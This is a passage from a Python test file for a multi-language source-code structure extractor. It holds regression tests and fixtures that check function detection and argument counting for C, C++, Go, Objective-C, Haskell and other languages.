    was carved out of -- a real Rust generic type argument (`Query<(&A, &mut
    B), Changed<A>>`) still needs its internal comma hidden from the
    top-level count for languages that legitimately use `<...>` this way.
    """
    detector = StructuralExtractor("rust", {"rust": {"rules": {}}})
    assert detector._count_top_level_args("(mut query: Query<(&A, &mut B), Changed<A>>)") == 1, (
        "rust generic type argument's internal comma leaked as a top-level separator"
    )

    cpp_detector = StructuralExtractor("cpp", {"cpp": {"rules": {}}})
    assert cpp_detector._count_top_level_args("(std::vector<int> a, int b)") == 2, "cpp template arg regressed"


def test_count_top_level_args_function_pointer_return_type_1854():
    """
    #1854: a C/C++ function returning a function pointer wraps its own name
    in parens (`void (*foo(int a, int b))(int c)`) -- the first "(" here
    belongs to that wrapper, not the parameter list, so blindly matching its
    balanced close truncated the body to "*foo(int a, int b)" and hid every
    comma inside the real params one depth level too deep.
    """
    detector = StructuralExtractor("c", {"c": {"rules": {}}})
    assert detector._count_top_level_args("void (*foo(int a, int b))(int c)") == 2
    assert detector._count_top_level_args("void (*noop(void))(int c)") == 0


def test_count_top_level_args_function_pointer_edge_cases_1854_review():
    """
    Adversarial cases surfaced during independent review of #1854's fix:
    - A pointer-to-MEMBER-function return type (`Cls::*foo`, not just `*foo`)
      is the same wrapper shape with a class-qualifier prefix -- the original
      fix's regex only recognized the unqualified form and silently fell back
      to the pre-#1854 (wrong) truncated count for this one.
    - A macro invocation that merely LOOKS like the wrapper shape at a glance
      (`EXECUTE_TASK(*task_ptr(a, b))`) must NOT be reinterpreted as one --
      real function-pointer-return-type syntax always has another "(" (the
      pointer's own parameter list) immediately after the wrapper's close;
      a macro call's closing paren has nothing of the sort after it.
    """
    detector = StructuralExtractor("cpp", {"cpp": {"rules": {}}})
    assert detector._count_top_level_args("void (ClassName::*foo(int a, int b))(int c)") == 2
    assert detector._count_top_level_args("EXECUTE_TASK(*task_ptr(a, b))") == 1


def test_slice_by_braces_cpp_bounds_args_search_text_1836():
    """
    #1836: cpp shared c's Mode-B fallback but was left out of the
    `args_sig_end` bound, so `args_search_text` fell back to the FULL block
    (signature + body) for cpp only. An empty-parameter-list signature
    doesn't satisfy the strict `args` regex, so the unbounded search kept
    scanning into the body and hallucinated an argument count off the first
    internal call statement's own parens instead of reporting 0.
    """
    from gitgalaxy.standards.language_standards import LANGUAGE_DEFINITIONS

    code = "void save_before_run() {\n    RegisterWindowMessage(a, b);\n}\n"
    detector = StructuralExtractor("cpp", LANGUAGE_DEFINITIONS)
    result = detector.splice(code, "", raw_content=code)
    fn = next(f for f in result["functions"] if f["name"] == "save_before_run")
    assert fn["args"] == 0, f"empty-arg cpp signature borrowed a call statement's args: {fn['args']}"


def test_slice_by_braces_cpp_args_counting_2012():
    """
    #2012: Pattern 1 - Zero-undercount for `operator()` and out-of-class methods with non-whitelisted types.
    Pattern 2 - Off-by-one overcount for constructors with member-initializer-lists.
    Also verifies normal constructors and `operator()` call sites remain unaffected.
    """
    from gitgalaxy.standards.language_standards import LANGUAGE_DEFINITIONS

    code = """
    // Pattern 1: operator() with real params
    bool operator()(const Node *p_left, const Node *p_right) const { return true; }
    
    // Pattern 1: out-of-class method with non-whitelisted type
    void Translator::BuildBuffer(mlir::ModuleOp module) { return; }
    
    // Pattern 2: zero-arg ctor with member-initializer list
    VBufStorage_buffer_t::VBufStorage_buffer_t() : member1(x), member2(y) { }
    
    // Normal: ctor with real params AND member-initializer list
    FooBar::FooBar(int a, float b) : member1(a) { }
    
    // Normal: operator() call-site (should not be extracted as a function definition)
    void caller() {
        bool res = my_obj(1, 2);
    }
    """
    detector = StructuralExtractor("cpp", LANGUAGE_DEFINITIONS)
    result = detector.splice(code, "", raw_content=code)
    funcs = {f["name"]: f for f in result["functions"]}

    assert funcs["operator()"]["args"] == 2, f"Expected 2 args, got {funcs['operator()']['args']}"
    assert funcs["Translator::BuildBuffer"]["args"] == 1, (
        f"Expected 1 arg, got {funcs['Translator::BuildBuffer']['args']}"
    )
    assert funcs["VBufStorage_buffer_t::VBufStorage_buffer_t"]["args"] == 0, (
        f"Expected 0 args, got {funcs['VBufStorage_buffer_t::VBufStorage_buffer_t']['args']}"
    )
    assert funcs["FooBar::FooBar"]["args"] == 2, f"Expected 2 args, got {funcs['FooBar::FooBar']['args']}"

    # call-site should not be extracted, so caller() should be the only other func
    assert "caller" in funcs
    assert "my_obj" not in funcs


def test_slice_by_braces_c_preprocessor_conditional_signature_1837():
    """
    #1837: a c/cpp signature duplicated across an #if/#else preprocessor
    conditional (micropython/gc.c's real-world `gc_mark_subtree`, gated on
    MICROPY_GC_SPLIT_HEAP) left `args_search_text` containing BOTH branches'
    signatures concatenated with preprocessor tokens between them --
    `.search()` found whichever branch came first textually rather than the
    branch immediately preceding the shared body.
    """
    from gitgalaxy.standards.language_standards import LANGUAGE_DEFINITIONS

    code = (
        "#if MICROPY_GC_SPLIT_HEAP\n"
        "static void gc_mark_subtree(mp_state_mem_area_t *area, size_t block)\n"
        "#else\n"
        "static void gc_mark_subtree(size_t block)\n"
        "#endif\n"
        "{\n"
        "    return;\n"
        "}\n"
    )
    detector = StructuralExtractor("c", LANGUAGE_DEFINITIONS)
    result = detector.splice(code, "", raw_content=code)
    fn = next(f for f in result["functions"] if f["name"] == "gc_mark_subtree")
    assert fn["args"] == 1, f"expected the #else branch's arity (1), got {fn['args']}"


def test_slice_by_braces_c_preprocessor_conditional_edge_cases_1837_review():
    """
    Adversarial cases surfaced during independent review of #1837's fix: the
    re-slice-after-the-last-#else/#elif heuristic must only fire for the
    "two whole, already-closed duplicate signatures" shape it targets, not
    for every #else/#elif that happens to appear anywhere before the body's
    "{". Both shapes below are real code patterns distinct from #1837's own
    corpus example (preprocessor-conditional PARAMETERS, and an unrelated
    conditional block sitting between an already-complete signature and its
    body) -- neither should be affected by the #1837 fix at all, so both
    must keep whatever count the underlying args-regex already produces
    without it (asserted here as the correct count for each shape).
    """
    from gitgalaxy.standards.language_standards import LANGUAGE_DEFINITIONS

    detector = StructuralExtractor("c", LANGUAGE_DEFINITIONS)

    # A single signature's OWN parameter list has a conditional param inside
    # it -- the #else here is nested INSIDE the still-open "(", not preceded
    # by a ")", so #1837's re-slice must not touch it.
    interior_code = "void foo(int a\n#ifdef X\n    , int b\n#else\n    , int c\n#endif\n) {\n    return;\n}\n"
    interior_result = detector.splice(interior_code, "", raw_content=interior_code)
    interior_fn = next(f for f in interior_result["functions"] if f["name"] == "foo")
    assert interior_fn["args"] == 3, f"interior conditional params: expected 3, got {interior_fn['args']}"

    # An unrelated, later #ifdef/#elif block sits between an already-COMPLETE
    # signature and the opening "{" -- must not be mistaken for a duplicate-
    # signature branch fork and discard the real (already-resolved) signature.
    later_code = "void foo(int a)\n#ifdef SOME_FLAG\n#elif OTHER_FLAG\n#endif\n{\n    return;\n}\n"
    later_result = detector.splice(later_code, "", raw_content=later_code)
    later_fn = next(f for f in later_result["functions"] if f["name"] == "foo")
    assert later_fn["args"] == 1, f"unrelated later conditional: expected 1, got {later_fn['args']}"


# Per-language real-pipeline args-count fixtures for #1209's mechanical tier.
# Each entry is (code, {function_name: expected_args}). Extend this dict as
# more languages get the capture-group fix (see issue #1209's checklist) --
# it's deliberately a flat per-language dict, not a class hierarchy, so
# adding a new language is a one-line addition.
ARGS_COUNT_FIXTURES: dict[str, tuple[str, dict[str, int]]] = {
    "c": (
        "int noop(void) { return 0; }\nint add(int a) { return a; }\nint add2(int a, int b) { return a + b; }\n",
        {"noop": 0, "add": 1, "add2": 2},
    ),
    "cpp": (
        "void noop() { return; }\nint add(int a) { return a; }\nint add2(int a, int b) { return a + b; }\n",
        {"noop": 0, "add": 1, "add2": 2},
    ),
    "go": (
        "func main() {}\nfunc Add(a int, b int) int { return a+b }\n",
        {"main": 0, "Add": 2},
    ),
    "kotlin": (
        "fun main() {}\nfun add(a: Int, b: Int): Int { return a + b }\nfun single(x: Int): Int { return x }\n",
        {"main": 0, "add": 2, "single": 1},
    ),
    "swift": (
        "func noop() {}\nfunc add(a: Int, b: Int) -> Int { return a + b }\nfunc single(x: Int) -> Int { return x }\n",
        {"noop": 0, "add": 2, "single": 1},
    ),
    "php": (
        "<?php\nfunction noop() {}\nfunction add($a, $b) { return $a + $b; }\nfunction single($x) { return $x; }\n",
        {"noop": 0, "add": 2, "single": 1},
    ),
    "perl": (
        "sub noop() { return; }\nsub add($a, $b) { return $a + $b; }\nsub single($x) { return $x; }\n",
        {"noop": 0, "add": 2, "single": 1},
    ),
    "lua": (
        "function noop()\n    return\nend\n\nfunction add(a, b)\n    return a + b\nend\n",
        {"noop": 0, "add": 2},
    ),
    "apex": (
        "public class Foo {\n"
        "    public void noop() {}\n"
        "    public Integer add(Integer a, Integer b) { return a + b; }\n"
        "}\n",
        {"noop": 0, "add": 2},
    ),
    "rust": (
        "fn noop() {}\nfn add(a: i32, b: i32) -> i32 { a + b }\nfn single(x: i32) -> i32 { x }\n",
        {"noop": 0, "add": 2, "single": 1},
    ),
    "solidity": (
        "contract Foo {\n"
        "    function noop() public {}\n"
        "    function add(uint a, uint b) public returns (uint) { return a + b; }\n"
        "    constructor(uint init) { }\n"
        "}\n",
        {"noop": 0, "add": 2, "constructor": 1},
    ),
    "scala": (
        "object Foo {\n  def add(a: Int, b: Int): Int = { a + b }\n  def noop(): Unit = {}\n}\n",
        {"add": 2, "noop": 0},
    ),
    "dart": (
        "void noop() {}\nint add(int a, int b) { return a + b; }\n",
        {"noop": 0, "add": 2},
    ),
    "csharp": (
        "class Foo {\n"
        "    public void Noop() {}\n"
        "    public int Add(int a, int b) { return a + b; }\n"
        "    public int Single(int x) { return x; }\n"
        "    public Foo(int init) { }\n"
        "}\n",
        {"Noop": 0, "Add": 2, "Single": 1, "Foo": 1},
    ),
    "java": (
        "class Foo {\n"
        "    public void noop() {}\n"
        "    public int add(int a, int b) { return a + b; }\n"
        "    public int single(int x) { return x; }\n"
        "    public Foo(int init) { }\n"
        "}\n",
        {"noop": 0, "add": 2, "single": 1, "Foo": 1},
    ),
    "javascript": (
        "function noop() {}\n"
        "function add(a, b) { return a + b; }\n"
        "function single(x) { return x; }\n"
        "class Foo {\n    method(a, b) { return a + b; }\n}\n",
        {"noop": 0, "add": 2, "single": 1, "method": 2},
    ),
    "typescript": (
        "function noop(): void {}\n"
        "function add(a: number, b: number): number { return a + b; }\n"
        "function single(x: number): number { return x; }\n"
        "class Foo {\n    method(a: number, b: number): number { return a + b; }\n}\n",
        {"noop": 0, "add": 2, "single": 1, "method": 2},
    ),
    "groovy": (
        "class Foo {\n"
        "    void noop() {}\n"
        "    int add(int a, int b) { return a + b }\n"
        "    int single(int x) { return x }\n"
        "}\n",
        {"noop": 0, "add": 2, "single": 1},
    ),
    "ruby": (
        "def noop()\n  return\nend\n\ndef add(a, b)\n  a + b\nend\n\ndef single(x)\n  x\nend\n",
        {"noop": 0, "add": 2, "single": 1},
    ),
    "powershell": (
        "function Noop() {\n    return\n}\n\nfunction Add($a, $b) {\n    return $a + $b\n}\n",
        {"Noop": 0, "Add": 2},
    ),
    "objective-c": (
        "@implementation Foo\n"
        "- (void)noop {\n    return;\n}\n"
        "- (void)doOne:(int)x {\n    return;\n}\n"
        "- (void)doTwo:(int)x withOther:(int)y {\n    return;\n}\n"
        # #1335: untyped keyword-message params (defaults to `id`, common in
        # 1990s NeXTSTEP-era code) used to undercount to 0.
        '- back:sender {\n    printf("back");\n}\n'
        # #1335: a genuinely zero-arg method (no colon at all) whose body
        # contains its own C-style call statement used to "borrow" that
        # call's own arg count instead of reporting 0.
        "- free {\n    if (Address) free(Address);\n}\n"
        # #1335: an untyped 1-param method whose body contains an unrelated
        # multi-arg call used to "borrow" THAT call's arg count (2) instead
        # of the method's own real arity (1).
        '- closeOthers:sender {\n    printf("%d", w);\n}\n'
        "@end\n",
        {"noop": 0, "doOne": 1, "doTwo": 2, "back": 1, "free": 0, "closeOthers": 1},
    ),
}


@pytest.mark.parametrize("lang", sorted(ARGS_COUNT_FIXTURES.keys()))
def test_args_count_real_pipeline(lang):
    """
    Runs #1209's fixed languages through the REAL LANGUAGE_DEFINITIONS regex
    + the real detector pipeline (not a mock), asserting the exact `args`
    value for each function in a small fixed snippet -- covering the zero-arg
    overcount shape #1199/#1209 are about (e.g. `func main()` was reported as
    2 args, not 0) for each language's own signature syntax.
    """
    from gitgalaxy.standards.language_standards import LANGUAGE_DEFINITIONS

    code, expected = ARGS_COUNT_FIXTURES[lang]
    detector = StructuralExtractor(lang, LANGUAGE_DEFINITIONS)
    result = detector.splice(code, "", raw_content=code)

    found = {fn["name"]: fn["args"] for fn in result.get("functions", []) if fn["name"] in expected}
    missing = set(expected) - set(found)
    assert not missing, f"[{lang}] expected function(s) not found in extraction: {missing}"
    for name, expected_args in expected.items():
        assert found[name] == expected_args, f"[{lang}] {name}: expected args={expected_args}, got args={found[name]}"


# Direct-block fixtures for #1209's Tier 2 languages whose functions don't
# reach `test_args_count_real_pipeline` above: scheme/matlab/fortran use
# paren-/keyword-delimited scoping (Lisp-family "end"/"END SUBROUTINE"-style
# or bare parens), not braces, so the generic dispatcher's Mode B
# brace-slicer (`_slice_by_braces`) never finds a body for them at all -- a
# real, pre-existing recall gap, but a SEPARATE one from args-counting (out
# of scope for #1209, which only fixes the count once a function IS found).
# These call `_calculate_block_metrics` directly with a hand-built block,
# bypassing the slicer, to isolate and pin the args-counting fix itself.
ARGS_COUNT_FIXTURES_DIRECT_BLOCK: dict[str, tuple[str, dict[str, int]]] = {
    "scheme": (
        '(define (noop)\n  (display "hi"))',
        {"noop": 0},
    ),
    "matlab": (
        "function [out1, out2] = add(a, b)\n  out1 = a + b;\n  out2 = a - b;\nend",
        {"add": 2},
    ),
    "haskell": (
        "showIt :: Show a => a -> String\nshowIt x = show x",
        {"showIt": 1},
    ),
    "fortran": (
        "SUBROUTINE noop\n  PRINT *, 'hi'\nEND SUBROUTINE noop",
        {"noop": 0},
    ),
}


@pytest.mark.parametrize("lang", sorted(ARGS_COUNT_FIXTURES_DIRECT_BLOCK.keys()))
def test_args_count_direct_block(lang):
    """
    Same intent as test_args_count_real_pipeline, for #1209's Tier 2
    languages whose functions the generic slicer dispatcher doesn't
    currently extract at all (see module comment above) -- calls
    `_calculate_block_metrics` directly with the whole fixture as one
    hand-built block, so this test only exercises the args-counting fix
    itself, not the unrelated slicing gap.
    """
    from gitgalaxy.standards.language_standards import LANGUAGE_DEFINITIONS

    block, expected = ARGS_COUNT_FIXTURES_DIRECT_BLOCK[lang]
    detector = StructuralExtractor(lang, LANGUAGE_DEFINITIONS)
    rules = LANGUAGE_DEFINITIONS[lang]["rules"]
    for name, expected_args in expected.items():
        fn, _ = detector._calculate_block_metrics(name, block, block.count("\n") + 1, 1, 2, rules)
        assert fn["args"] == expected_args, f"[{lang}] {name}: expected args={expected_args}, got args={fn['args']}"


def test_count_colon_selector_segments_helper():
    """
    Direct unit coverage for `_count_colon_selector_segments`, the
    Objective-C keyword-message-selector counter (#1209): counts one
    argument per top-level `label:(Type)` segment, ignoring colons/parens
    nested inside a parameter's own type or a string literal.
    """
    detector = StructuralExtractor("objective-c", {"objective-c": {"rules": {}}})
    cases = [
        ("doThing:(int)x", 1),
        ("doThing:(int)x withOther:(int)y", 2),
        ("doThing:(int)x withOther:(int)y andThird:(NSString *)z", 3),
        ("callback:(void (^)(int))block", 1),
        # #1314 (follow-up): a space between the `:` and the `(Type)` annotation --
        # real, common corpus style (language-crucible/data/objective-c/worldwideweb/
        # HyperText.h writes `applyStyle: (HTStyle *)style` throughout) -- used to
        # undercount to 0 since the old adjacency check required `:` and `(` to be
        # immediately consecutive characters.
        ("applyStyle: (HTStyle *)style", 1),
        ("doThing: (int)x withOther: (int)y", 2),
    ]
    for args_str, expected in cases:
        actual = detector._count_colon_selector_segments(args_str)
        assert actual == expected, f"_count_colon_selector_segments({args_str!r}) == {actual}, expected {expected}"


def test_objectivec_bodyless_interface_declarations_extracted():
    """
    #1314 (follow-up): an @interface block's method declarations (`- foo;`,
    `+ bar:(Type)x;`) are bodyless -- terminated by `;`, never `{...}` -- and are
    the ENTIRE public surface of every objc header, not an edge case. Pre-fix,
    the generic Mode-B brace-only fallback in `_extract_functions_generic_slicer`
    (detector.py) required an actual `{` within the search window and silently
    dropped every one of these when none was found nearby (confirmed against
    language-crucible/data/objective-c/worldwideweb/HyperText.h: 38 of 38 real
    interface methods were dropped, 0% recall on that file). func_start's own
    regex already matched them correctly -- the gap was purely in detector.py's
    downstream body-boundary search, not the regex.
    """
    from gitgalaxy.standards.language_standards import LANGUAGE_DEFINITIONS

    code = (
        "@interface HyperText : Text\n"
        "{\n"
        "    int slotNumber;\n"
        "}\n"
        "+ newAnchor:(Anchor *)anAnchor;\n"
        "- setupWindow;\n"
        "- readSGML:(NXStream *)stream diagnostic:(int)d;\n"
        "@end\n"
    )
    detector = StructuralExtractor("objective-c", LANGUAGE_DEFINITIONS)
    result = detector.splice(code, "", raw_content=code)

    found = {fn["name"]: fn["args"] for fn in result.get("functions", [])}
    expected = {"newAnchor": 1, "setupWindow": 0, "readSGML": 2}
    missing = set(expected) - set(found)
    assert not missing, f"bodyless @interface declaration(s) not extracted: {missing}"
    for name, expected_args in expected.items():
        assert found[name] == expected_args, f"{name}: expected args={expected_args}, got args={found[name]}"


def test_objectivec_bodyless_c_style_prototype_excluded_not_misattributed():
    """
    #1336: a plain C-style prototype (`extern void write_rtf_header(NXStream*
    rtfStream);`) has no function body to score -- unlike group 1's `-`/`+`
    method alternative (a real recall gap closed in #1314's follow-up), this
    is out of func_start's scope entirely, matching how the tree-sitter
    ground truth (a bare `declaration` node, not `function_definition`)
    doesn't count it as a real function either. Pre-fix, it was still
    matched by accident whenever a `{` happened to appear later in the
    bounded search window, and the `{...}` it grabbed belonged to unrelated
    code (in the corpus case, an `@interface` block's own ivar list several
    lines later) -- giving a phantom function a bogus body span. Fixed by
    detecting the bodyless-`;` case explicitly and rejecting it, rather than
    falling through to a blind forward `{` search. Reproduces the exact
    shape of language-crucible/data/objective-c/worldwideweb/HyperText.h.
    """
    from gitgalaxy.standards.language_standards import LANGUAGE_DEFINITIONS

    code = (
        "extern void write_rtf_header(NXStream* rtfStream);\n"
        "extern HyperAccess * HTAccMgr;\n"
        "\n"
        "@interface HyperText:Text\n"
        "{\n"
        "    int slotNumber;\n"
        "}\n"
        "@end\n"
    )
    detector = StructuralExtractor("objective-c", LANGUAGE_DEFINITIONS)
    result = detector.splice(code, "", raw_content=code)

    found = {fn["name"] for fn in result.get("functions", [])}
    assert "write_rtf_header" not in found, (
        "bodyless C-style prototype should be excluded from func_start, not misattributed a body"
    )


def test_objectivec_c_style_real_definition_still_extracted():
    """
    #1336 companion: excluding bodyless C-style prototypes must not regress
    real C-style function *definitions* (which do have a `{...}` body) --
    those still reach the `brace` branch in `_slice_by_braces`'s objc
    handling unchanged, since their own `{` always arrives before any `;`.
    """
    from gitgalaxy.standards.language_standards import LANGUAGE_DEFINITIONS

    code = "static inline void c_style_func(int a, float b) {\n    return;\n}\n"
    detector = StructuralExtractor("objective-c", LANGUAGE_DEFINITIONS)
    result = detector.splice(code, "", raw_content=code)

    found = {fn["name"]: fn["args"] for fn in result.get("functions", [])}
    assert "c_style_func" in found, "real C-style function definition should still be extracted"
    assert found["c_style_func"] == 2, f"expected args=2, got args={found['c_style_func']}"


def test_go_bodyless_function_declarations_extracted():
    """
    #1756: Go's bodyless function declarations (assembly-backed
    implementations and //go:linkname targets -- func memmove(to, from
    unsafe.Pointer, n uintptr) with no { body) have no brace group, and
    Go's automatic-semicolon-insertion rule means the declaration ends at
    the end of its signature line without a literal ;. The generic
    Mode-B brace-only fallback in _slice_by_braces (detector.py)
    required a { within the search window and silently dropped every
    one of these. func_start's own regex always matched them -- the gap
    was purely in detector.py's downstream body-boundary search, not the
    regex (the same shape as #1314/#1319's rust/objc bodyless handling).
    """
    from gitgalaxy.standards.language_standards import LANGUAGE_DEFINITIONS

    code = (
        "package runtime\n"
        "\n"
        "func memmove(to, from unsafe.Pointer, n uintptr)\n"
        "\n"
        "func add(a, b int) int {\n"
        "\treturn a + b\n"
        "}\n"
        "\n"
        "//go:linkname gogo runtime.gogo\n"
        "func gogo()\n"
        "\n"
        "func sub(a, b int) int {\n"
        "\treturn a - b\n"
        "}\n"
    )
    detector = StructuralExtractor("go", LANGUAGE_DEFINITIONS)
    result = detector.splice(code, "", raw_content=code)

    found = {fn["name"]: fn for fn in result.get("functions", [])}
    expected = {"memmove", "gogo", "add", "sub"}
    missing = expected - set(found)
    assert not missing, f"Go function declaration(s) not extracted: {missing}"
    assert found["memmove"]["args"] == 3, f"expected memmove args=3, got args={found['memmove']['args']}"
    # Bodyless declarations span their signature line only -- no phantom body.
    assert found["memmove"]["start_line"] == found["memmove"]["end_line"], (
        "bodyless memmove should span just its signature line"
    )
    assert found["gogo"]["start_line"] == found["gogo"]["end_line"], "bodyless gogo should span just its signature line"


def test_go_bodyless_declaration_not_misattributed_following_block():
    """
    #1756 companion: when a bodyless declaration is followed by an
    unrelated brace block (a struct literal later in the file), the
    pre-fix generic brace search grabbed that block as the phantom
    function's body. A bodyless declaration must end at its own
    signature line instead.
    """
    from gitgalaxy.standards.language_standards import LANGUAGE_DEFINITIONS

    code = (
        "package main\n"
        "\n"
        "func flushICache(begin, end uintptr)\n"
        "\n"
        "type Foo struct {\n"
        "\tX int\n"
        "}\n"
        "\n"
        "func bar() int {\n"
        "\treturn 1\n"
        "}\n"
    )
    detector = StructuralExtractor("go", LANGUAGE_DEFINITIONS)
    result = detector.splice(code, "", raw_content=code)

    found = {fn["name"]: fn for fn in result.get("functions", [])}
    assert "flushICache" in found, "bodyless flushICache should be extracted"
    assert found["flushICache"]["end_line"] == 3, (
        f"flushICache must end at its own signature line, got end_line={found['flushICache']['end_line']}"
    )
    assert "bar" in found, "ordinary braced function after the struct must still be extracted"


def test_go_channel_direction_operator_does_not_poison_body_scan():
    """
    #1760 review follow-up: Go's channel-direction operator (chan<- / <-chan)
    contains a lone < that an angle-bracket depth counter would never balance,
    stalling the body-boundary scan and silently dropping every following
    function. Go has no angle-bracket grouping (generics are [T any]), so the
    Go branch must track parens and brackets only.
    """
    from gitgalaxy.standards.language_standards import LANGUAGE_DEFINITIONS

    code = (
        "package main\n"
        "\n"
        "func makeSendChan() chan<- int {\n"
        "\tch := make(chan int)\n"
        "\treturn ch\n"
        "}\n"
        "\n"
        "func makeRecvChan() <-chan int {\n"
        "\tch := make(chan int)\n"
        "\treturn ch\n"
        "}\n"
        "\n"
        "func add(a, b int) int {\n"
        "\treturn a + b\n"
        "}\n"
    )
    detector = StructuralExtractor("go", LANGUAGE_DEFINITIONS)
    result = detector.splice(code, "", raw_content=code)

    found = {fn["name"]: fn for fn in result.get("functions", [])}
    expected = {"makeSendChan", "makeRecvChan", "add"}
    missing = expected - set(found)
    assert not missing, f"Go function(s) dropped by channel operator: {missing}"
    assert found["makeSendChan"]["args"] == 0, "makeSendChan should take no args"
    assert found["makeRecvChan"]["args"] == 0, "makeRecvChan should take no args"


def test_go_struct_return_type_not_truncated_at_type_literal_brace():
    """
    #1756 wrinkle: a return type that itself contains a brace group
    (func f() struct{ X int } { ... }) puts a top-level { before the real
    body -- the generic brace search stopped at the struct literal's {,
    truncating the function's span to the type. The real body must be
    included.
    """
    from gitgalaxy.standards.language_standards import LANGUAGE_DEFINITIONS

    code = (
        "package main\n"
        "\n"
        "func makePoint() struct{ X, Y int } {\n"
        "\treturn struct{ X, Y int }{1, 2}\n"
        "}\n"
        "\n"
        "func other() int {\n"
        "\treturn 2\n"
        "}\n"
    )
    detector = StructuralExtractor("go", LANGUAGE_DEFINITIONS)
    result = detector.splice(code, "", raw_content=code)

    found = {fn["name"]: fn for fn in result.get("functions", [])}
    assert "makePoint" in found, "makePoint should be extracted"
    assert found["makePoint"]["start_line"] == 3
    assert found["makePoint"]["end_line"] == 5, (
        f"makePoint's span must include its real body, got end_line={found['makePoint']['end_line']}"
    )
    assert "other" in found, "ordinary braced function after it must still be extracted"


def test_objectivec_args_body_lookalikes_excluded_by_signature_bound():
    """
    #1335: `_slice_by_braces`'s objc branches now bound `args_pattern.search`
    to the method's own signature text (up through its opening `{`/`;`), via
    `_calculate_block_metrics`'s `args_search_text` param -- never the whole
    body. Before this, `args_pattern.search(block)` scanned the ENTIRE
    function body, so once a method's own signature didn't match any args
    branch (a genuinely zero-arg method, or -- pre-#1335 -- an untyped
    keyword-message param), the search fell through and matched the first
    C-style-shaped call/statement found later in the body instead.

    This test pins the exact confirmed corpus shapes from #1335:
    - `Anchor.m`'s `- free { if (Address) free(Address); ... }` must
      measure 0 args, not 1 borrowed from the body's own `free(Address)`
      call.
    - `HyperManager.m`'s `- closeOthers:sender { ... printf("...", w); ... }`
      (1 real untyped param) must measure 1, not 2 borrowed from the
      unrelated `printf(...)` call's 2 comma-separated arguments.
    - A ternary inside the body (`cond ? isOn : isOff`), and a keyword-
      message SEND inside the body (`[self doThing:a withB:b];`) -- both of
      which the args regex CAN still match in isolation (see
      test_objectivec.py's
      test_objc_args_known_limitation_body_lookalikes_shielded_by_pipeline)
      -- must not be reachable at all once bounded to the signature.
    """
    from gitgalaxy.standards.language_standards import LANGUAGE_DEFINITIONS

    code = (
        "@implementation Anchor\n"
        "- free {\n"
        "    if (Address) free(Address);\n"
        "}\n"
        "@end\n"
        "\n"
        "@implementation HyperManager\n"
        "- closeOthers:sender {\n"
        '    printf("%d", w);\n'
        "}\n"
        "- flagCheck {\n"
        "    BOOL isOn = flag ? isOn : isOff;\n"
        "}\n"
        "- notify {\n"
        "    [self doThing:a withB:b];\n"
        "}\n"
        "@end\n"
    )
    detector = StructuralExtractor("objective-c", LANGUAGE_DEFINITIONS)
    result = detector.splice(code, "", raw_content=code)

    found = {fn["name"]: fn["args"] for fn in result.get("functions", [])}
    assert found.get("free") == 0, f"expected free's args=0 (no body leak), got {found.get('free')}"
    assert found.get("closeOthers") == 1, (
        f"expected closeOthers's args=1 (own untyped param, no printf leak), got {found.get('closeOthers')}"
    )
    assert found.get("flagCheck") == 0, f"expected flagCheck's args=0 (no ternary leak), got {found.get('flagCheck')}"
    assert found.get("notify") == 0, (
        f"expected notify's args=0 (no keyword-message-send leak), got {found.get('notify')}"
    )


def test_objectivec_c_style_bare_statement_not_misidentified_as_function():
    """
    #1336: a bare two-token call/return statement (`return foo(x);`) must not
    be captured as a phantom function. Pre-fix this was "harmless" only
    because detector.py's brace-only fallback happened to drop any match with
    no `{` nearby -- a coincidence, not a guarantee (a distant unrelated `{`
    could still resurrect it, the same accidental-attribution bug #1336 fixes
    for real prototypes). Two independent layers now close this off: the
    regex-level "not a function" keyword shield (language_standards.py)
    prevents the match from happening at all, and even if it somehow did,
    `_slice_by_braces`'s bodyless-`;` rejection for group 2 would still
    refuse to attribute a body to it.
    """
    from gitgalaxy.standards.language_standards import LANGUAGE_DEFINITIONS

    code = "- (int)computeSomething {\n    return computeValue(1, 2);\n}\n"
    detector = StructuralExtractor("objective-c", LANGUAGE_DEFINITIONS)
    result = detector.splice(code, "", raw_content=code)

    found = {fn["name"] for fn in result.get("functions", [])}
    assert "computeValue" not in found, "bare `return foo(x);` statement misidentified as a function"
    assert "computeSomething" in found


def test_detector_haskell_multiclause_let_binding_dedups_to_one_node():
    """
    Regression test for #1564/#1565's follow-on: a multi-clause `let`
    binding declared inline in a `do` block, using Haskell's idiomatic
    alignment style where clause 2+ lines up under the bound NAME rather
    than under `let` itself:

        let isPandocCiteproc (JSONFilter f) = takeBaseName f == "pandoc-citeproc"
            isPandocCiteproc _              = False

    Confirmed on the real language-crucible pandoc corpus (App.hs:270-271).
    Before #1564, `func_start`'s "let" exclusion blocked clause 1 outright,
    so only clause 2 (which doesn't start with "let") ever matched --
    coincidentally producing one satellite, but only by omission, not by
    correct dedup. Fixing #1564 let clause 1 match too, which exposed a
    real bug in `_slice_by_indentation`'s haskell continuation-dedup: it
    required the SAME indent as the group's first clause to treat a later
    same-named match as an already-absorbed clause -- true for
    where/instance-block siblings (all flush at one column, #1442), but
    false here, since clause 2 sits deeper than clause 1's `let`. That
    produced two separate, overlapping FunctionNodes for one real function.
    The fix drops the indent-equality requirement (`start_idx <
    last_hs_group_end` alone is sufficient, since clause 1's own dedent-scan
    already proves clause 2 is body content nested inside it).
    """
    from gitgalaxy.standards.language_standards import LANGUAGE_DEFINITIONS

    code = (
        "main = do\n"
        '  let isPandocCiteproc (JSONFilter f) = takeBaseName f == "pandoc-citeproc"\n'
        "      isPandocCiteproc _              = False\n"
        "  when (any isPandocCiteproc filters) $\n"
        '    report $ Deprecated "pandoc-citeproc filter"\n'
    )
    detector = StructuralExtractor("haskell", LANGUAGE_DEFINITIONS)
    result = detector.splice(code, "", raw_content=code)

    matches = [fn for fn in result.get("functions", []) if fn["name"] == "isPandocCiteproc"]
    assert len(matches) == 1, f"expected exactly one deduped isPandocCiteproc node, got {matches}"
    assert matches[0]["start_line"] == 2
    assert matches[0]["args"] == 1


def test_detector_haskell_guard_continuation_not_misread_as_equation():
    """
    Regression test for #2082: a guard's boolean condition spanning two
    physical lines, joined by `||`, must not have its continuation line
    misread as a fresh `name pattern... = expr` equation just because that
    continuation line independently looks like one.

    Confirmed on the real language-crucible pandoc corpus (Shared.hs:472-476):

        unEmojify :: [Inline] -> [Inline]
        unEmojify
          | extensionEnabled Ext_gfm_auto_identifiers exts ||
            extensionEnabled Ext_ascii_identifiers exts = walk unEmoji
          | otherwise = id

    `unEmojify` is the real function (correctly captured via its `::`
    signature). `extensionEnabled` on the continuation line is a CALL inside
    the ongoing `||` expression, not a definition -- before the fix, it
    independently satisfied the equation-form `func_start` alternative and
    was reported as a spurious second function.
    """
